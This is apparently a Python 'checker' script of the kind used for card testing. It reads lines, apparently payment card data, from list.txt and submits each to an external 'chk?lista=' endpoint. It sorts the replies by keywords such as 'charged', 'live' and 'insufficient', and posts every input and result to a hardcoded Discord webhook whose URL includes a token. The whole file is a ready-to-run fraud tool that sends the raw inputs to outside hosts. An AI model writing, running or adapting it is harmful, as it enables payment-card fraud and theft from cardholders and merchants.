import requests
import json
import urllib.parse
import time

INPUT_FILE = "list.txt"
BASE_URL = "https://zlatan-appsify.onrender.com/chk?lista="
WEBHOOK_URL = "https://discord.com/api/webhooks/1443879354420559902/YkR6tWOSeIB8bl1XlqV6rGjA4eb9b8PQcX7rywqEjqOIgmIPIZ2rcIhWxjyaq3ECILDM"

approved = []
declined = []
unknown = []
errors = []


def send_embed(title, description, color):
    payload = {
        "embeds": [
            {
                "title": title,
                "description": description[:4090],
                "color": color,
                "footer": {"text": "String Checker Logger"}
            }
        ]
    }
    try:
        requests.post(WEBHOOK_URL, json=payload, timeout=10)
    except:
        pass


def classify(msg: str):
    msg = msg.lower()
    if "approve" in msg or "success" in msg or "charged" in msg or "live" in msg:
        return "approved"
    if "declined" in msg or "dead" in msg or "insufficient" in msg or "incorrect" in msg:
        return "declined"
    return "unknown"


with open(INPUT_FILE, "r", encoding="utf-8") as f:
    lines = f.read().splitlines()

send_embed("Checker Started", "The check process has begun.", 3447003)  # Blue


for line in lines:
    if not line.strip():
        continue

    url = BASE_URL + urllib.parse.quote(line)

    try:
        r = requests.get(url, timeout=15)
        data = r.json()

        response_msg = data.get("Response", {}).get("message", "No response message")
        category = classify(response_msg)

        record = f"**Input:** `{line}`\n**Response:** {response_msg}"

        if category == "approved":
            approved.append(record)
            print("[APPROVED]", record)
            send_embed("✅ APPROVED", record, 3066993)    # Green

        elif category == "declined":
            declined.append(record)
            print("[DECLINED]", record)
            send_embed("❌ DECLINED", record, 15158332)   # Red

        else:
            unknown.append(record)
            print("[UNKNOWN]", record)
            send_embed("⚠ UNKNOWN", record, 15844367)    # Yellow

    except json.JSONDecodeError:
        record = f"**Input:** `{line}`\n**Error:** Invalid JSON"
        errors.append(record)
        print("[ERROR]", record)
        send_embed("🚫 ERROR", record, 9807270)           # Gray

    except Exception as e:
        record = f"**Input:** `{line}`\n**Error:** {str(e)}"
        errors.append(record)
        print("[ERROR]", record)
        send_embed("🚫 ERROR", record, 9807270)           # Gray

    time.sleep(1)  # avoid rate limit


# Save files
open("approved.txt", "w", encoding="utf-8").write("\n".join(approved))
open("declined.txt", "w", encoding="utf-8").write("\n".join(declined))
open("unknown.txt", "w", encoding="utf-8").write("\n".join(unknown))
open("error.txt", "w", encoding="utf-8").write("\n".join(errors))

# Final summary embed
summary = (
    f"✅ Approved: {len(approved)}\n"
    f"❌ Declined: {len(declined)}\n"
    f"⚠ Unknown: {len(unknown)}\n"
    f"🚫 Errors: {len(errors)}"
)

send_embed("Finished Checking", summary, 5763719)  # Purple

print("✅ DONE CHECKING")
